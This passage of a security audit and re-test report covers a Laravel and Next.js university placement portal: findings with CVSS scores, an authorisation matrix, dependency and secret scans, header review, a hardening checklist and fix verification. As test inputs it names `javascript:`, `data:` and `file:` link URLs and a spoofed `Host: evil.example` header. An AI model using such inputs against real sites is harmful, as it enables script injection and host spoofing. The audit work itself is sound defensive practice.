**Remediation:** bundle the worker (`new URL('pdfjs-dist/build/pdf.worker.min.mjs', import.meta.url)`) so the CSP can be `'self'`-only.

**Verification test:** `grep -rn "unpkg.com" frontend/components` returns nothing (lint rule or CI grep).

### SEC-019 · [Low] Policy-document link URLs are not validated
| Field | Value |
|---|---|
| CVSS v3.1 | 3.4 (AV:N/AC:L/PR:H/UI:R/S:U/C:L/I:L/A:N) |
| CWE / OWASP | CWE-79 (`javascript:` URL), CWE-20 · A03 |
| Affected | `PolicyDocumentController.php:41,79` (`'url' => ['required_if:type,link','nullable','string']`); `update()` keeps an old URL when the type switches to pdf without a file (`:86-93`); `frontend/components/forms/shared/declarationchecklist.tsx:283-289` builds an `<a>` in the DOM with `link.href = pdfUrl.url` for non-http values |
| Confidence | **CONFIRMED-CODE**: no scheme check. **LIKELY**: execution of a `javascript:` URL in the company's browser via the DOM-built download link. The React-rendered `href`s are protected by React 19. |
| Status | **Fixed** in P-1 (2026-10-10): §12 |

**Impact:** an admin, or anyone holding an admin token, could plant script that runs in companies' sessions when they click Download.

**Remediation:** validate `url` as `url:https` (or `https` and `mailto`), and refuse non-http values in the DOM download helper.

**Verification test:** `tests/Feature/Security/PolicyDocumentTest::test_link_url_rejects_non_https_schemes` (`javascript:`, `data:`, `file:` → 422).

### SEC-020 · [Low] Unbounded work in Phase 1 lists, spreadsheet imports and company JSON
| Field | Value |
|---|---|
| CVSS v3.1 | 2.7 (AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:L) |
| CWE / OWASP | CWE-770 Allocation without limits · A04 · API4 |
| Affected | Unpaginated: `AdminFormReviewController` JNF/INF queues, `AdminCompanyController`, `AlumniOutreachController`, `CompanyJnfController`/`CompanyInfController` lists (`paginate(` → 0 matches). `SpreadsheetImportService::rows():30-41` loads the whole sheet (no read filter or cell limit; `MAX_ROWS=5000` is checked after loading; `toArray(null, true, …)` evaluates formulas). `StoreJnfRequest` `form_data` is `nullable\|json` with no size or depth cap. |
| Confidence | **CONFIRMED-CODE**; **LIKELY** for memory exhaustion on a crafted compressed xlsx (admin-only upload) |
| Status | Open |

**Remediation:**
- Paginate the Phase 1 lists.
- Use a PhpSpreadsheet read filter limited to the expected columns and `MAX_ROWS+1` rows.
- Reject uploads whose uncompressed size exceeds a cap.
- Cap `form_data` size (e.g. 256 KB) and depth.

**Verification test:** `tests/Feature/Security/ImportLimitsTest::test_import_rejects_oversized_sheet_without_loading_it` (memory delta under a threshold for a 50,000-row file).

### SEC-021 · [Low] Committed artefacts contain personal data and internal details
| Field | Value |
|---|---|
| CVSS v3.1 | 3.1 (AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N) |
| CWE / OWASP | CWE-540, CWE-359 Exposure of private personal information · A05 |
| Affected | `conclave/index.html` (5 personal mobile numbers, 8 `iitism.ac.in` email addresses); `log_filtered.txt` (developer path, SQL error output); `CDC/frontend/test-results/.last-run.json` |
| Confidence | **CONFIRMED-CODE** (counts only, values never printed) |
| Status | **Partly fixed** (2026-10-09): `conclave/` removed; `log_filtered.txt` and `frontend/test-results/.last-run.json` still tracked: §12 |

**Remediation:** remove the artefacts from tracked files. Publish the conclave page from a separate repository with consent for the listed contacts.

**Verification test:** a CI check that those paths no longer exist in the repository.

### SEC-022 · [Low] Existence oracles and a 500 on an admin route (Phase 1 F-040)
| Field | Value |
|---|---|
| CVSS v3.1 | 2.7 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:N), informational CVSS: no confidentiality loss |
| CWE / OWASP | CWE-204, CWE-209 · A01 · API1 |
| Affected | Company `PUT/PATCH /company/jnfs/{jnf}` and `/company/infs/{inf}` validate before checking ownership (422 instead of 404 for another company's IDs); autosave `exists:jnfs,id` (422 vs 404); route-model-binding 404 text differs from the custom "JNF not found."; `GET /admin/policy-documents/{id}` → 500 (`show()` missing) |
| Confidence | **CONFIRMED-LIVE**: these are the only 6 anomalies in `security/evidence/authorization_matrix.md` |
| Status | **Fixed** in P-1 (2026-10-10): §12 |

**Remediation:** check ownership before validating, use one 404 body everywhere, and remove `show` from the `apiResource` (`->except('show')`).

**Verification test:** `AuthorizationMatrixTest::test_every_api_route_enforces_authentication_role_and_tenant_boundaries` (must report 0 violations).

### Informational (no direct exploit)
| ID | Item | Evidence | Confidence |
|---|---|---|---|
| SEC-023 | Signed URLs (resume links, private `/storage/{path}`) are only as strong as `APP_KEY`. The current key isn't in git, but an **older** key (`ba…w=`) was committed in `238560d`; never reuse it. | history scan | CONFIRMED-CODE |
| SEC-I01 | `User`, `Application`, `Resume` and `Jnf` keep privileged columns (`role`, `is_super_admin`, `is_active`, `status`, review fields) in `$fillable`. Every current write is whitelisted, but a future `->update($request->validated())` would become privilege escalation. Use `forceFill` in admin code. | static review, `MassAssignmentAndLogicTest` 6/6 | CONFIRMED-CODE |
| SEC-I02 | Company JNF/INF `show` returns raw `statusHistories` including admin draft "NOTE:" entries and admin user IDs (`CompanyJnfController:64-70`). Students receive `reviewed_by`/`decided_by` admin IDs. | static review | CONFIRMED-CODE |
| SEC-I03 | Any admin can change a student's login email (`AdminStudentController.php:217`) and resend the invitation: account takeover within admin trust (audited). Consider requiring super-admin. | static review | CONFIRMED-CODE |
| SEC-I04 | A company can change `hr_email` without re-verification (`CompanyProfileController.php:40`); CDC mail then goes to the new address. | static review | CONFIRMED-CODE |
| SEC-I05 | Unused dependencies widen the attack surface: `smalot/pdfparser` (composer); `axios` (high advisory), `date-fns`, `@mui/x-data-grid` (npm). Dead live route `POST /api/company/uploads` stores files on the public disk. | grep (0 imports), route list | CONFIRMED-CODE |
| SEC-I06 | `stripHtml` (`formpreview.tsx:139-151`) decodes entities after stripping tags (double decode). Safe today because every output is rendered as React text; dangerous if ever fed to an HTML sink. | static review | CONFIRMED-CODE |
| SEC-I07 | Sanctum tokens are unlimited per user, with no device list or "log out everywhere". | `SessionTokenTest::test_T4_7` | CONFIRMED-LIVE |
| SEC-I08 | Failed logins and authorisation failures aren't logged; company applicant exports aren't audited (admin `posting.export`/`cycle.export` are); no alerting on 401/403 bursts. | `AuthController`, `CompanyPipelineController::export` | CONFIRMED-CODE |
| SEC-I09 | With the log mailer, `storage/logs/laravel.log` holds full emails, including about 2,800 set-password and reset links (no passwords or bearer tokens). Fine locally; production must never run `MAIL_MAILER=log`. | log counts | CONFIRMED-LIVE |
| SEC-I10 | PHP `upload_max_filesize=2M` locally while policy PDFs and imports allow 5 MB (D51); `allow_url_fopen=On`; `expose_php=On`. | `php -i` | CONFIRMED-LIVE |
| SEC-I11 | No malware scanning of uploaded resumes or PDFs (consider ClamAV). `email_logs.error_message` stores raw transport exception text. | code | CONFIRMED-CODE |
| SEC-I12 | India DPDP Act 2023 readiness (not legal advice; for the institute's review): a purpose and consent notice at a student's first login; a retention period for past-cycle data and resumes; a breach-notification runbook; access logging of personal-data exports (admin exports are audited, company exports aren't); a data-principal request process (access/correction). | — | — |

---

## 5. Authorisation Matrix (route × actor → status): a strength

`tests/Feature/Security/AuthorizationMatrixTest.php`, full table in [`security/evidence/authorization_matrix.md`](security/evidence/authorization_matrix.md).

**Setup:**
- Every `api/*` route and method: **170 route/method pairs** (PUT and PATCH counted separately).
- **8 actors:** guest, STUDENT_A, STUDENT_B (given A's resume, application and notification IDs), suspended student, COMPANY_A, COMPANY_B (given A's IDs), ADMIN, SUPER_ADMIN.
- **1,360 matrix cells plus 36 cross-tenant probes = 1,396 requests**, each rolled back in a savepoint, with real Sanctum tokens.

**Results:**
- **0 wrong-actor 2xx, 0 data leaks.** Response bodies were scanned for the other tenant's marker strings.
- Every guest request to an authenticated route → 401. Every wrong role → 403. A suspended student with a live token → 403 "Account suspended. Contact CDC." (D99).
- STUDENT_B on STUDENT_A's resume, application or notification → 404. COMPANY_B on any of COMPANY_A's postings, rounds, proposals, exports or forms → 404.
- The only anomalies are the 6 Phase 1 rows in SEC-022.

**Confirmed live as well** (`security/evidence/P5_2_idor_live.txt`):
- Student 26QA0001 against student 26QA0005's resume file, update and delete, application update and withdraw, and notification → 404 each.
- Student → admin student detail and photo → 403.
- Company Beta against Alpha's posting, applicants, export, proposals, new proposal, JNF read, delete and duplicate → 404 each.
- `POST ?_method=DELETE` spoofing → 404.
- Alpha's own applicant list carries exactly the Q10.2 fields: no phone or personal email (sharing off), no DOB, category, PwD, gender, admin flags or offers (`security/evidence/P5_2_company_applicant_fields.txt`).

**Mass assignment and business logic** (`MassAssignmentAndLogicTest`, 6/6 pass):
- Smuggled `role`, `is_super_admin`, `status`, flags, `current_cgpa`, `branch`, `roll_no`, `admin_remark(s)`, `result` and similar fields are ignored by the student profile, resume upload and relabel, apply, company JNF and company proposal endpoints.
- Another student's `resume_id` → 422.
- Students never receive applicant counts.
- Withdraw/re-apply loops only mail the student themself.

---

## 6. Dependency & Secrets Results

**`composer audit`:** 41 advisories (`security/evidence/composer_audit.txt`).
- Relevant: `laravel/framework` v12.56.0 (High CRLF in email rule; Medium temporary signed URL path confusion; Low debug-page XSS) and `symfony/mime` v7.4.7 / `symfony/mailer` v7.4.6 (CRLF in Address; sendmail argument injection, not used). See SEC-011.
- Low relevance: guzzle and psr7 (no outbound HTTP), league/commonmark (no user markdown), symfony/yaml, flysystem (low).
- `phpoffice/phpspreadsheet` 5.10.0: no advisory; XXE is blocked by `Reader\Security\XmlScanner` (rejects `<!DOCTYPE`).

**`npm audit --omit=dev`, frontend:** 12 vulnerable packages: 3 critical (`next` 16.2.1, `next-auth` 5.0.0-beta.30, `@auth/core`), 5 high (`axios`, `form-data`, `nanoid`, `postcss`, `sharp`), 2 moderate, 2 low (`quill` 2.0.3 HTML-export XSS, not used). See SEC-001. `pdfjs-dist` 5.4.296 is past the CVE-2024-4367 fix.

**`npm audit`, backend:** production 0; dev toolchain 8 (Vite, concurrently, shell-quote and others; never deployed).

**Secrets** (`security/secret_scan.py`, values redacted; `security/evidence/secrets_tree.tsv`, `security/evidence/secrets_history.tsv`):

| Secret | Where | Same as the value in use? | Status |
|---|---|---|---|
| `NEXTAUTH_SECRET` `de…90` | `SETUP_GUIDE.md` history `238560d` | **yes** | owner rotation in progress (SEC-002) |
| `APP_KEY` `ba…w=` | `.env.example` history `238560d` | no (current key differs) | never reuse (SEC-023) |

`.env` and `.env.local` have never been committed.

---

## 7. Security Headers & Configuration Review

| Header / setting | Current | Recommended |
|---|---|---|
| Frontend `Content-Security-Policy` | **absent** | strict CSP (SEC-009) |
| Frontend `X-Frame-Options` | `SAMEORIGIN` | keep (or `frame-ancestors 'self'`) |
| Frontend `X-Content-Type-Options` | `nosniff` | keep |
| Frontend `Referrer-Policy` | `strict-origin-when-cross-origin` | keep |
| Frontend `Permissions-Policy` | camera, mic and geolocation off | keep |
| Frontend `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | keep; serve over HTTPS only |
| Frontend `X-Powered-By` | absent (`poweredByHeader: false`) | keep |
| API `X-Powered-By` | `PHP/8.5.5` | remove (`expose_php=Off`) |
| API `Cache-Control` on personal data | `no-cache, private` | `no-store` |
| API `X-Content-Type-Options` / `X-Frame-Options` | absent | `nosniff` / `DENY` |
| `/storage/*` headers | none | `nosniff`, CSP `sandbox`, `Content-Disposition` for non-images |
| CORS | exact allow-list, credentials true, localhost always allowed | env-driven list only (SEC-017) |
| Session cookie | `authjs.session-token`: HttpOnly, SameSite=Lax; Secure added by Auth.js on HTTPS | keep; ensure HTTPS (`__Secure-` prefix) |
| NextAuth session lifetime | 30 days | match the token lifetime (SEC-015) |
| Sanctum token lifetime | 7 days; revoked on logout and password reset | keep |
| Rate limits | `api` 60/min per user or IP; `login` 10/min per account; `signed-files` 600/min per IP; reset links 1 per 60 s per account | see SEC-008 / SEC-010 |
| `APP_DEBUG` (example) | `false` | keep; `APP_ENV=production` in prod |
| `LOG_LEVEL` (example) | `debug` | `warning` in prod |
| `trustHosts` / `trustProxies` | not configured | configure (SEC-007, SEC-008) |
| `next.config.ts` `allowedDevOrigins` | includes LAN IP | dev only |

---

## 8. Positive Findings (controls that work well)

- **Authorisation is the portal's strongest area** (§5):
  - zero cross-tenant access in 1,396 automated requests plus manual probes;
  - consistent 404 for other tenants' objects;
  - the role middleware uses a strict `in_array`;
  - `active` middleware on every authenticated route.
- **Mass assignment:** every request-fed write is whitelisted (`SELF_EDITABLE`, literal arrays, `StoreJnfRequest` status limited to draft/submitted). There's no `$request->all()` anywhere.
- **Password reset:** single-use, email-bound, 60-minute expiry, revokes every API token, link built from `FRONTEND_URL` even under spoofed Host and X-Forwarded-Host headers, generic response text.
- **Invitations:** 7-day, single-use, the old link dies on resend, the mail carries only the roll number and links. Verification and reset tokens are stored hashed (sha256 / bcrypt).
- **Tokens:** expire after 7 days, logout revokes them for every role (all three shells call `/auth/logout`), suspension is enforced on every request, and deleted admins' tokens fail.
- **Resumes and photos:**
  - private disk, generated names (`{slot}_{uuid}.pdf`), served as `application/pdf`;
  - old files deleted on replace;
  - PHP extensions blocked by the framework;
  - signed links resist ID swap, expiry extension and signature removal;
  - the private `/storage/{path}` route requires a signature.
- **PDF proxy (D59):** session-gated, exact-origin plus path allow-list, `redirect: "error"`, PDF-only, forced `application/pdf` with `nosniff` and `no-store`.
- **Injection:**
  - all raw SQL is static and every search binds its values (about 80 probes found no errors and no delays);
  - React escapes all stored text, and there's no `{!! !!}` in any Blade template;
  - Symfony encodes CR/LF in subjects;
  - spreadsheet XXE is blocked;
  - Phase 2 Excel exports write text as explicit strings (D87).
- **No debug tooling is exposed:** Telescope, Horizon, Ignition and Debugbar are absent; `/.env`, `/.git/HEAD` and `/vendor` return 404.
- **Privacy:** students never see applicant counts, admin flags or other students. Companies see only Q10.2 fields and published results.
- **Audit trail:** every admin write in Phase 1 and Phase 2 is audit-logged (QA F-012), and audit logs have no mutation routes.

---

## 9. Re-verification of Previously Known Issues (PROJECT_CONTEXT §12 A1–A11 and M0 fixes)

| Item | Now | Evidence |
|---|---|---|
| A1 public `POST /auth/admin/register` mints admins | **Fixed** | not in the route inventory (`security/evidence/routes.md`) |
| A2 company sets its own form `status` / `admin_remarks` | **Fixed** | `StoreJnfRequest` status ∈ {draft, submitted}; D4; `MassAssignmentAndLogicTest::test_5_4_company_form…` |
| A3 `form_data` accepted wholesale (declarations, CGPAs client-only) | **Still open** (Low) | `StoreJnfRequest` `form_data` is `nullable\|json`; SEC-020 |
| A4 `/api/proxy-pdf` unauthenticated SSRF | **Fixed** | session gate, allow-list, no redirects (D59; code `app/api/proxy-pdf/route.ts`) |
| A5 Sanctum tokens never expire, never revoked | **Fixed** | `sanctum.expiration = 10080`; `SessionTokenTest::T4_1`, `T4_2` |
| A6 token exposed to client JavaScript | **Still open** (by design) | SEC-009 |
| A7 enumeration on registration endpoints | **Still open** | SEC-003 |
| A8 unauthenticated, uncaptcha'd public writes | **Still open** | SEC-010 |
| A9 `Str::random` verification token | **OK** | uses `random_bytes`; stored as sha256 |
| A10 rich text stored raw | **Mitigated** (rendered as text) | static review; SEC-I06 |
| A11 committed artefacts | **Partly fixed** | `PROJECT_STATUS.md` removed; others remain (SEC-021) |
| M0 D9 `active` on every authenticated route | **Holds** | matrix |
| M0 D11 shells revoke tokens | **Holds** | `companyshell.tsx:29-31`, admin and student shells |
| M0 D17 fail-closed auth checks | **Holds** (and mitigates GHSA-8fpg-xm3f-6cx3) | `proxy.ts`, `proxy-pdf/route.ts` |
| D59 proxy hardening | **Holds** | code |
| D87 export formula safety (xlsx) | **Holds**; the Phase 1 CSV isn't covered | SEC-006 |

---

## 10. Production Hardening Checklist

| Item | State |
|---|---|
| HTTPS everywhere, HSTS, HTTP→HTTPS redirect; `APP_URL` / `FRONTEND_URL` / `NEXTAUTH_URL` on https | CANNOT-VERIFY-LOCALLY (frontend sends HSTS already) |
| `APP_ENV=production`, `APP_DEBUG=false`, `php artisan config:cache` | CANNOT-VERIFY-LOCALLY (example has `APP_DEBUG=false` but `APP_ENV=local`) |
| `AdminUserSeeder` reads `env()` directly → breaks under `config:cache` | MISSING (Phase 1 G) |
| Document root = `backend/public` only; `.env`, `.git`, `storage/logs`, `vendor` unreachable | VERIFIED-LOCALLY (404/403 for all; `artisan serve` serves `public/`) |
| Least-privilege MySQL user (no SUPER/FILE, no remote root), DB not public, encrypted backups | CANNOT-VERIFY-LOCALLY (local uses `root` with an empty password) |
| Queue worker supervised, non-root; `storage/` not world-writable | CANNOT-VERIFY-LOCALLY |
| PHP: `expose_php=Off`, `allow_url_include=Off`, upload limits ≥ app limits | MISSING locally (`expose_php=On`, `upload_max_filesize=2M`) |
| Web server: `nosniff` and CSP on `/storage/*`, no PHP execution under `public/storage` | CANNOT-VERIFY-LOCALLY (SEC-004, SEC-016) |
| Next.js: `poweredByHeader:false` (set), `next start` behind a reverse proxy, `trustHost` with a fixed `AUTH_URL` | VERIFIED-LOCALLY / CANNOT-VERIFY-LOCALLY |
| Next.js and next-auth upgraded; `npm audit` and `composer audit` release gates | MISSING (SEC-001, SEC-011) |
| Laravel `trustHosts()` / `trustProxies()` for the production host and proxy | MISSING (SEC-007, SEC-008) |
| SMTP: institutional relay; SPF, DKIM and DMARC on the sending domain | CANNOT-VERIFY-LOCALLY |
| Rotate `NEXTAUTH_SECRET`; never reuse the old `APP_KEY` | owner rotation in progress (SEC-002, SEC-023) |
| `MAIL_MAILER` must never be `log` in production (reset links would be written to logs) | CANNOT-VERIFY-LOCALLY (SEC-I09) |
| Backups of the private resume disk, with a restore test | CANNOT-VERIFY-LOCALLY |
| Monitoring and alerting on 401/403/429 bursts and admin logins | MISSING (SEC-I08) |

---

## 11. Remediation Roadmap

**Fix before launch (High, plus the session secret)**

| Item | Effort |
|---|---|
| SEC-001: upgrade `next` (≥16.3.8) and `next-auth`; add audit release gates | M |
| SEC-002: new random `NEXTAUTH_SECRET` per environment | S (owner) |

**Fix within 2 weeks (Medium)**

| Item | Effort |
|---|---|
| SEC-004: drop SVG logos; `/storage` headers | S |
| SEC-005: same-origin `callbackUrl` helper | S |
| SEC-006: CSV formula-escape helper | S |
| SEC-007: verification link from config; `trustHosts()` | S |
| SEC-003: uniform login timing and forgot-password responses; silence registration enumeration | M |
| SEC-008: forwarded client IP from Next.js; backoff instead of a hard lock; CAPTCHA (needs approval) | M |
| SEC-009: frontend CSP; plan server-side token handling | M (CSP) / L (token) |
| SEC-010: per-recipient mail cooldowns and caps | S |
| SEC-011: `composer update` of laravel/framework and symfony/mime/mailer | S |

**Backlog (Low / Info)**

| Item | Effort |
|---|---|
| SEC-012 password blocklist | S |
| SEC-013 shorter, application-bound resume links | M |
| SEC-014 single-use verification links | S |
| SEC-015 session maxAge and 401 handling | S |
| SEC-016 API headers | S |
| SEC-017 CORS and env defaults | S |
| SEC-018 bundle the pdf.js worker | S |
| SEC-019 policy URL validation | S |
| SEC-020 pagination and import limits | M |
| SEC-021 remove artefacts | S |
| SEC-022 ownership before validation; remove policy `show` | S |
| SEC-I01–I12 | S–M each |

---

## 12. Re-test Results (P-1 "Hardening", 2026-10-10)

Re-test of the fixes the owner approved on 2026-10-09 and 2026-10-10 (milestone P-1 of Phase 3, branch `phase3`, pull request #1). Each item was fixed in its own commit with a failing test written first. Decisions are in `PHASE3_DECISIONS.md` (P3-D8 to P3-D28). Method as before: code review, automated tests and ordinary requests against the local stack; no attack tooling, no real mail.

### 12.1 Finding status

| ID | Sev | Status | What changed | Verified by |
|---|---|---|---|---|
| SEC-001 | High | **FIXED** | `next` 16.3.8 (pinned), `next-auth` 5.0.0-beta.32; unused `axios`, `date-fns`, `@mui/x-data-grid`, `smalot/pdfparser` removed | `npm audit --omit=dev --audit-level=high` exit 0 (was exit 1: critical `@auth/core`, high `next`/`axios`); build and e2e on 16.3.8 |
| SEC-002 | Medium | **OPEN (owner)** | Not a code change. The owner has not confirmed the rotation. | — |
| SEC-003 | Medium | **OPEN** (not in the approved list) | — | `AuthenticationTest::test_A3_1…`, `::test_A3_2…` still fail (group `qa-open`) |
| SEC-004 | Medium | **FIXED in code** | `svg` removed from both logo rules; the rule sniffs content, so an SVG or HTML file renamed `.png` is refused too; frontend pickers updated | `UploadTest` (2). **Left:** `/storage/*` needs `nosniff` and a restrictive CSP in the web-server config |
| SEC-005 | Medium | **FIXED** | shared `lib/safecallbackurl.js`, used by both login pages | unit tests (3); e2e "a callbackUrl to another site is ignored after login" passes, which settles the LIKELY part |
| SEC-006 | Medium | **FIXED** | `CsvSafe::cell()` on every cell of the JNF/INF CSV; column order kept | `ExportInjectionTest` (2) |
| SEC-007 | Medium | **FIXED** | verification link built from `APP_URL`; Laravel `TrustHosts` on, hosts from `APP_URL` + `TRUSTED_HOSTS` (exact names) | `AuthenticationTest::test_A3_9_verification_link_uses_configured_origin`, `::test_A3_9_trusted_hosts_…`; live in production mode: `Host: evil.example` → 400 |
| SEC-008 | Medium | **FIXED** | Next.js signs the client IP (HMAC, `INTERNAL_PROXY_SECRET`); Laravel trusts it only with a valid signature; login has its own 600/min per-IP limit; the hard per-account lock became a short backoff | `LoginThrottleTest` (7), `FixF016LoginThrottleTest`; live HMAC interop. **Left:** production must run Next.js behind a reverse proxy that appends the real address to `X-Forwarded-For`; CAPTCHA not approved |
| SEC-009 | Medium | **PARTLY FIXED** | baseline CSP on every page, no `'unsafe-eval'` in production, scripts and workers from this site only | `tests-unit/csp.test.mjs` (4); e2e header + no-violation check on the production build. **Left:** `'unsafe-inline'` (a nonce-based policy needs every page rendered dynamically); the API token is still readable by page JavaScript (Phase 1 A6, by design) |
| SEC-010 | Medium | **FIXED** (cooldown) | one mail per address per 10 minutes on the recruiter verification link and the alumni confirmation; 429 + `Retry-After` | `MailAbuseTest` (2). Also new: daily recipient cap for student mail (`MailDailyCapTest`, 6). **Left:** per-IP daily caps and CAPTCHA not approved |
| SEC-011 | Medium | **FIXED** | `laravel/framework` 12.69.3, `symfony/mime` and `symfony/mailer` 7.4.19 | `composer audit --locked`: 41 advisories → 3 low, all dev-only `symfony/yaml`; `--no-dev` passes; `HeaderInjectionTest` |
| SEC-012 | Low | **OPEN** (not in the approved list) | — | `AuthenticationTest::test_A3_4_common_or_personal_passwords_are_rejected` still fails (`qa-open`) |
| SEC-013 | Low | **OPEN** (not in the approved list) | — | `SessionTokenTest::test_T4_8_resume_link_handed_to_a_company_dies_…` still fails (`qa-open`) |
| SEC-014 | Low | **FIXED** | the link works once; the address then stays verified for 24 hours (also fixes Phase 1 B7) | `AuthenticationTest::test_A3_9_verification_link_is_single_use` (now passes), `::test_A3_9_verified_address_outlives_the_link_lifetime` |
| SEC-015 | Low | **FIXED** | NextAuth session `maxAge` = 7 days and the session ends when the API token does; admin and company helpers sign out on 401 | `SessionTokenTest::test_T4_5_…`; unit tests (3); live: cookie lifetime 7.00 days, revoked token → signed out |
| SEC-016 | Low | **FIXED** (Laravel responses) | `SecurityHeaders` middleware: `nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: no-referrer`; `no-store` on authenticated and signed-link responses; `X-Powered-By` removed | `HeadersTest` (2); live headers. **Left (server settings):** `expose_php=Off`, HSTS at the proxy, `/storage/*` headers |
| SEC-017 | Low | **OPEN** (not in the approved list) | — | — |
| SEC-018 | Low | **FIXED** | pdf.js worker bundled with the app | no `unpkg.com` in the frontend; live: policy PDF renders with the bundled worker under the CSP |
| SEC-019 | Low | **FIXED** | link documents must be `https` URLs; a link turned into a PDF needs the file; the company checklist never uses a non-http, non-site address | `PolicyDocumentTest` (2) |
| SEC-020 | Low | **OPEN** (not in the approved list) | — | — |
| SEC-021 | Low | **PARTLY FIXED** | `conclave/` removed from the repository (housekeeping, 2026-10-09) | **Left:** `log_filtered.txt`, `frontend/test-results/.last-run.json` are still tracked |
| SEC-022 | Low | **FIXED** | ownership is checked before validation on company JNF/INF update; one 404 body for a missing and a foreign form; no model class or id in any API 404; `policy-documents` has no `show` route (405, was 500) | `ExistenceOracleTest` (2); `AuthorizationMatrixTest` **0 violations** (was 6) |
| SEC-I05 | Info | **PARTLY** | the four unused packages are gone | **Left:** the dead route `POST /api/company/uploads` |
| — | — | **DONE** | hard-coded password removed from `CompanySeeder` (env value or random) | `SeederSecretsTest` (2) |

SEC-023 and SEC-I01 to SEC-I12 (other than I05) are unchanged.

### 12.2 Authorisation matrix (re-run)

267 route/method pairs × 8 actors: 1,848 cells plus 36 cross-tenant and edge probes = **1,884 requests, 0 violations, 0 server errors** (it was 6 violations, all SEC-022). Evidence: `security/evidence/retest_p1_authorization_matrix.md`. The QA permission matrix (6 actors, 1,422 requests) also reports 0 violations: `qa/evidence/retest_p1_permission_matrix.md`.

### 12.3 Gates

| Gate | Result |
|---|---|
| `php artisan test --exclude-group=qa-open` | **710 passed** (10,339 assertions) |
| `qa-open` group | 4 tests, failing on purpose: SEC-003 (2), SEC-012, SEC-013 |
| Tests of the P-1 changes on MySQL (throwaway database) | 36 passed; `migrate:fresh --seed` and the demo seeder succeed on MySQL |
| `npx tsc --noEmit` / `npm run lint` / `npm run test:unit` / `npm run build` | clean / 0 errors (76 warnings, unchanged) / 10 passed / exit 0 |
| e2e against the production build | 9 passed (smoke 4, student and admin 5) |
| `npm audit --omit=dev --audit-level=high` | exit 0 (2 low: `quill`) |
| `composer audit --locked --no-dev` | exit 0 |

Full detail: `qa/evidence/retest_p1_gates.txt`.

### 12.4 Notes from the fix phase

- **Deployment requirements created by these fixes:** the same `INTERNAL_PROXY_SECRET` in the backend and frontend environments; a reverse proxy in front of Next.js that appends the client address to `X-Forwarded-For`; `TRUSTED_HOSTS` if the API is reached by any name other than the one in `APP_URL`; a queue worker (mail over the daily cap waits for the next day); `expose_php=Off` and the `/storage/*` headers on the web server.
- **Sessions:** everyone signed in before the SEC-015 change is signed out once.
- **CSP and PDFs:** PDF responses (`*.pdf`, `/api/proxy-pdf`) are sent without the CSP header, because Chrome's built-in viewer shows a blank frame when the PDF itself carries the policy.
- **Test suite on MySQL:** the suite is written for in-memory SQLite. Run as-is on MySQL it gives 702 passed and 8 failed; all 8 are assumptions inside the tests (array order from JSON columns or unordered rows, a hard-coded id, a SQLite `PRAGMA`), not product faults.
- **Still needing an owner decision:** SEC-002 (rotation), SEC-003, SEC-012, SEC-013, SEC-017, SEC-020, and the items marked "not approved" above (CAPTCHA, per-IP mail caps, a nonce-based CSP, server-side token handling).

---

## Appendix: PoC scripts, tool outputs, raw matrix

| File | What |
|---|---|
| `security/SEC_PROGRESS.md` | audit memory file, findings log D-01…D-24 |
| `security/attack_surface.md` | Part 1 recon: routes, data inventory, uploads, outbound connections, trust diagram, STRIDE |
| `security/route_inventory.php` → `security/evidence/routes.md` | route × middleware × role × params table |
| `security/evidence/db_columns.txt` | schema with row counts |
| `security/secret_scan.py` → `security/evidence/secrets_tree.tsv`, `security/evidence/secrets_history.tsv` | redacted secret scans |
| `security/evidence/composer_audit.txt`, `security/evidence/npm_audit_frontend.json`, `security/evidence/npm_audit_backend*.json` | dependency audits |
| `security/poc/A3_1_login_timing.py` → `security/evidence/A3_1_login_timing.txt` | login timing oracle |
| `security/evidence/A3_2_enumeration.txt` | forgot-password and registration enumeration |
| `security/poc/A3_3_bruteforce.sh` → `security/evidence/A3_3_bruteforce.txt` | lockout and spray |
| `security/evidence/T4_3_T4_4_session.txt` | session cookie flags, token exposure |
| `security/poc/P5_2_idor_live.sh` → `security/evidence/P5_2_idor_live.txt`, `security/evidence/P5_2_company_applicant_fields.txt` | live IDOR probes, company field exposure |
| `security/poc/P6_1_sqli_probe.sh` → `security/evidence/P6_1_sqli.txt` | the initial search/filter probes (before switching to code review) |
| `security/evidence/P8_headers.txt` | response headers (frontend, API, storage, CORS preflight) |
| `security/evidence/authorization_matrix.md` | raw 8-actor matrix |
| `backend/tests/Feature/Security/AuthenticationTest.php` | Part 3 (8 pass / 4 fail: SEC-003 ×2, SEC-012, SEC-014) |
| `backend/tests/Feature/Security/SessionTokenTest.php` | Part 4 (5 pass / 1 fail: SEC-013) |
| `backend/tests/Feature/Security/AuthorizationMatrixTest.php` | Part 5.1 (fails only on the SEC-022 rows) |
| `backend/tests/Feature/Security/MassAssignmentAndLogicTest.php` | Part 5.4/5.5 (6/6 pass) |

Run the security tests with: `php artisan test --group=security`.
